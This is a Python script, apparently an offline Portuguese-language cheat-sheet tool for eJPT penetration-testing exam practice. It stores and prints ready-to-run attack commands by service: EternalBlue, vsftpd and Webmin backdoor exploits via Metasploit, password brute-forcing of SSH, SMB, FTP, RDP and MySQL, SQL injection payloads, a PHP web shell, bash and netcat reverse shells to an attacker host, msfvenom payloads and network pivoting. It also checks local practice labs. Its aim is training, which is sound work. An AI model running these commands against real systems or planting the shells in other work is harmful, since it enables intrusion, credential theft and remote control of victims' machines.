#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ajuda.py — consulta rápida e OFFLINE do arsenal eJPT do LIBERTUS.

Uso:
  python3 ~/LIBERTUS/ejpt/ajuda.py            # lista os assuntos disponíveis
  python3 ~/LIBERTUS/ejpt/ajuda.py 445        # cenário da porta 445 (SMB)
  python3 ~/LIBERTUS/ejpt/ajuda.py smb        # mesmo, por nome
  python3 ~/LIBERTUS/ejpt/ajuda.py lab        # testa DVWA/Juice/SSH agora
  python3 ~/LIBERTUS/ejpt/ajuda.py msf        # regras do Metasploit (wordlists, /tmp)
  python3 ~/LIBERTUS/ejpt/ajuda.py hydra      # quando o hydra mente
Funciona sem internet. Não substitui os .md — é o atalho de 5 segundos.
"""
import subprocess
import sys
from pathlib import Path

EJPT = Path(__file__).resolve().parent
WL = "/home/libertus/wordlists"
VENV = "/home/libertus/venvs/pentest/bin"

CENARIOS = {
    "445": ("SMB / MS17-010 (o mais cobrado)", [
        "nmap -p445 --script smb-os-discovery,smb-vuln-ms17-010 IP",
        "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS IP; set LHOST LHOST; run\"",
        "# se 'Cannot reliably check exploitability': acrescentar  set ForceExploit true",
        "# shares anônimos (msf não faz anônimo):",
        f"{VENV}/smbclient.py guest@IP -no-pass",
        "# com credencial:",
        f"{VENV}/smbclient.py usuario:'senha'@IP      # dentro: shares / use SHARE / ls / cat arq.txt / get arq.txt",
        f"{VENV}/psexec.py usuario:'senha'@IP         # SYSTEM se admin",
        f"msfconsole -q -x \"use auxiliary/scanner/smb/smb_login; set RHOSTS IP; set SMBUser usuario; set PASS_FILE {WL}/pass/top10k.txt; set STOP_ON_SUCCESS true; set VERBOSE true; run; exit -y\"",
    ]),
    "21": ("FTP", [
        "nmap -p21 --script ftp-anon IP",
        "ftp IP     # usuário: anonymous  senha: (enter)  -> ls -la / binary / mget * / bye",
        "grep -riE 'pass|user|login|key|admin' . 2>/dev/null",
        "nmap -p21 -sV IP | grep -i vsftpd   # 2.3.4 -> backdoor",
        "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS IP; run\"",
        f"hydra -l admin -P {WL}/pass/top1000.txt ftp://IP -t 4 -f    # confirmar o acerto no ftp depois",
    ]),
    "22": ("SSH", [
        "nmap -p22 -sV --script ssh-auth-methods IP",
        "ssh usuario@IP        # REUSAR credencial achada antes de brutar",
        f"{VENV}/python {EJPT}/ssh_brute.py -t IP -p 22 -l root -P {WL}/pass/top10k.txt -T 4",
        f"msfconsole -q -x \"use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE {WL}/pass/top10k.txt; set STOP_ON_SUCCESS true; set VERBOSE true; run; exit -y\"",
        "# hydra local NÃO tem SSH (compiled without LIBSSH). No Kali do exame tem.",
        "chmod 600 id_rsa && ssh -i id_rsa usuario@IP     # chave achada em FTP/web",
    ]),
    "80": ("Web (80/443/8080/3000)", [
        "nmap -p80,8080 --script http-title,http-headers,http-methods IP",
        "curl -s -i http://IP/ | head -20 ; curl -s http://IP/robots.txt",
        f"gobuster dir -u http://IP -w {WL}/web/directory-list-2.3-small.txt -x php,html,txt,bak -t 40 --no-error",
        "# SQLi manual primeiro:  id=1'   |   id=1 OR 1=1-- -   |   id=1 ORDER BY 1,2,3-- -",
        "sqlmap -u \"http://IP/page.php?id=1\" --batch --dbs",
        "sqlmap -u \"http://IP/page.php?id=1\" --batch -D db -T users --dump",
        "# SPA (200 em tudo): gobuster ... --exclude-length N",
        "printf '<?php system($_GET[\"c\"]); ?>' > ~/sh.php   # upload -> http://IP/uploads/sh.php?c=id",
    ]),
    "3306": ("MySQL", [
        "nmap -p3306 --script mysql-info,mysql-enum IP",
        "mysql -h IP -u root -p        # senha vazia / root / achada",
        f"msfconsole -q -x \"use auxiliary/scanner/mysql/mysql_login; set RHOSTS IP; set USERNAME root; set PASS_FILE {WL}/pass/top10k.txt; set STOP_ON_SUCCESS true; run\"",
        "# dentro: show databases; use X; show tables; select * from users;",
    ]),
    "3389": ("RDP", [
        "nmap -p3389 -sV --script rdp-enum-encryption,rdp-ntlm-info IP",
        f"msfconsole -q -x \"use auxiliary/scanner/rdp/rdp_login; set RHOSTS IP; set USERNAME administrator; set PASS_FILE {WL}/pass/top10k.txt; set STOP_ON_SUCCESS true; run\"",
        "xfreerdp /v:IP /u:usuario /p:senha /cert:ignore",
    ]),
    "10000": ("Webmin (clássico de rede interna)", [
        "curl -sk https://IP:10000/ | head",
        "searchsploit webmin",
        "msfconsole -q -x \"use exploit/linux/http/webmin_backdoor; set RHOSTS IP; set LHOST LHOST; set SSL true; run\"",
    ]),
    "pivot": ("Pivoting (rede interna)", [
        "# dentro da sessão de borda:",
        "run get_local_subnets        # ou shell -> ipconfig /all | ip addr",
        "run autoroute -s 10.10.10.0/24",
        "use auxiliary/server/socks_proxy",
        "set VERSION 5 ; set SRVPORT 1080 ; set SRVHOST 127.0.0.1 ; run -j",
        "proxychains4 nmap -sT -Pn -p22,80,445,8080 10.10.10.0/24    # -sT -Pn -p SEMPRE",
        "# alternativa: no meterpreter -> portfwd add -l 8080 -p 80 -r 10.10.10.20",
    ]),
    "shell": ("Reverse shell / transferência", [
        "nc -lvnp 4444                                   # no Kali",
        "bash -i >& /dev/tcp/LHOST/4444 0>&1             # alvo Linux (nc local sem -e)",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 4444 >/tmp/f",
        "msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f elf -o ~/payloads/x.elf   # NUNCA em /tmp",
        "python3 -m http.server 8000                     # servir arquivo pro alvo",
    ]),
    "msf": ("Regras do Metasploit nesta máquina", [
        "msfconsole -q -x \"...comandos...; exit -y\"     # sempre exit -y",
        "# wordlist SEMPRE em $HOME: " + WL + "/pass/top10k.txt",
        "# /usr/share/wordlists NÃO é legível pelo snap (OptionValidateError)",
        "# msfvenom/nmap não gravam em /tmp -> salvar em ~/",
        "db_status     # postgres conectado: creds / hosts / services / loot",
        "search ms17-010 ; search ssh_login ; search vsftpd",
    ]),
    "hydra": ("Quando o hydra mente", [
        "curl -s -i -d 'usuario=admin&senha=errado' http://IP/login.php | head -12",
        "# corpo com texto de erro -> confiável | 302 vazio/CSRF -> hydra VAI dar falso positivo",
        "# confirmar TODO acerto antes de responder questão:",
        "curl -s -i -d 'usuario=admin&senha=SENHA' http://IP/login.php | head",
        "# local: hydra sem ssh/rdp (compilado sem libssh) -> ssh_brute.py ou msf ssh_login",
    ]),
    "traps": ("Armadilhas medidas em 21/out (ler antes de culpar o alvo)", [
        "# 1) hydra http-get SEM F= -> falso positivo (deu admin:admin num form cuja senha era password)",
        "hydra -l admin -P ~/wordlists/pass/top1000.txt IP -s 8080 http-post-form \"/login.php:u=^USER^&p=^PASS^:F=Login failed\"",
        "# 2) form com CSRF token -> hydra nao serve; usar:",
        "python3 ~/LIBERTUS/ejpt/web_login.py -u http://IP/login.php -l admin -p password --extra 'Login=Login'",
        "# 3) msf -r: script so funciona em $HOME sem ponto no nome (/tmp e .arquivo falham) -> use -x",
        "# 4) sqlmap 'not injectable' nao e veredito: testar UNION na mao antes de descartar",
        "curl -s \"http://IP/page?id=1' UNION SELECT 1,user(),database(),3-- -\"",
        "# 5) john com --format errado roda e nao acha nada (md5=raw-md5, windows=nt, shadow=sha512crypt)",
        "# 6) ssh_brute.py so roda com ~/venvs/pentest/bin/python (paramiko)",
        "# 7) recon rapido de 1 alvo: bash ~/LIBERTUS/ejpt/scan.sh IP",
    ]),
}

ALIASES = {
    "smb": "445", "ms17": "445", "eternalblue": "445", "win": "445",
    "ftp": "21", "ssh": "22", "web": "80", "http": "80", "8080": "80", "443": "80",
    "mysql": "3306", "rdp": "3389", "webmin": "10000",
    "pivoting": "pivot", "socks": "pivot", "proxychains": "pivot",
    "reverseshell": "shell", "reverse": "shell", "nc": "shell",
    "metasploit": "msf", "msfvenom": "msf",
    "trap": "traps", "armadilha": "traps", "armadilhas": "traps", "falso": "traps",
    "erro": "traps", "travei": "traps", "bug": "traps",
}


def show(key):
    titulo, cmds = CENARIOS[key]
    print(f"\n=== {key} — {titulo} ===")
    for c in cmds:
        marca = "  " if c.startswith("#") else "$ "
        print(marca + c)
    print()


def _porta_aberta(host, porta):
    import socket
    try:
        with socket.create_connection((host, porta), timeout=3):
            return True
    except OSError:
        return False


def lab():
    print("\n=== LAB LOCAL (checagem ao vivo) ===")
    alvos = [
        ("DVWA        ", "http://localhost:8080/"),
        ("Juice Shop  ", "http://localhost:3000/"),
    ]
    for nome, url in alvos:
        try:
            r = subprocess.run(["curl", "-s", "-m", "4", "-o", "/dev/null", "-w", "%{http_code}", url],
                               capture_output=True, text=True, timeout=10)
            print(f"{nome} HTTP {r.stdout.strip() or '???':<5} {url}")
        except Exception as e:
            print(f"{nome} ERRO {e}")
    for nome, porta, cred in (("SSH treino  ", 2222, "msfadmin:msfadmin"),
                              ("FTP treino  ", 2121, "msfadmin:msfadmin")):
        estado = "ABERTA" if _porta_aberta("127.0.0.1", porta) else "FECHADA"
        print(f"{nome} porta {porta:<5} {estado:<8} {cred}")
    try:
        r = subprocess.run(["docker", "ps", "--format", "{{.Names}}\t{{.Status}}"],
                           capture_output=True, text=True, timeout=15)
        nomes = [l for l in r.stdout.splitlines()
                 if any(k in l for k in ("dvwa", "juice", "ssh", "smb", "ftp"))]
        print("\ncontainers:")
        print("\n".join("  " + n for n in nomes) or "  nenhum")
    except Exception as e:
        print("docker: erro", e)
    for nome, cont in (("SMB legacy  ", "smb-legacy"), ("SMB modern  ", "smb-modern")):
        try:
            r = subprocess.run(["docker", "inspect", cont, "--format",
                                "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}"],
                               capture_output=True, text=True, timeout=10)
            ip = r.stdout.strip()
            print(f"{nome} {ip or 'fora do ar'}")
        except Exception:
            print(f"{nome} docker indisponivel")
    print("\nsubir tudo: bash ~/LIBERTUS/ejpt/lab_up.sh")
    print("SSH treino: ssh -p 2222 msfadmin@127.0.0.1  (msfadmin:msfadmin)")
    print("SMB enum:   nmap -Pn -p445 --script smb-enum-shares,smb-os-discovery <IP do SMB>\n")


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        print("Assuntos:")
        for k, (t, _) in CENARIOS.items():
            print(f"  {k:<8} {t}")
        print("\nArquivos completos:")
        for f in ("CHEATSHEET_eJPT.md", "CENARIOS_eJPT.md", "PROTOCOLO_EXAME.md",
                  "tools_status.md", "NOITE_PREP_RESUMO.md"):
            p = EJPT / f
            print(f"  {'OK ' if p.exists() else 'FALTA'} {p}")
        return 0

    arg = sys.argv[1].strip().lower().replace("/", "")
    if arg in ("lab", "demo", "test"):
        lab()
        return 0
    arg = ALIASES.get(arg, arg)
    if arg in CENARIOS:
        show(arg)
        return 0
    # busca por texto
    achou = [(k, t) for k, (t, _) in CENARIOS.items() if arg in k or arg in t.lower()]
    if achou:
        for k, _ in achou:
            show(k)
        return 0
    print(f"não conheço '{sys.argv[1]}'. Rode sem argumento para ver a lista.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
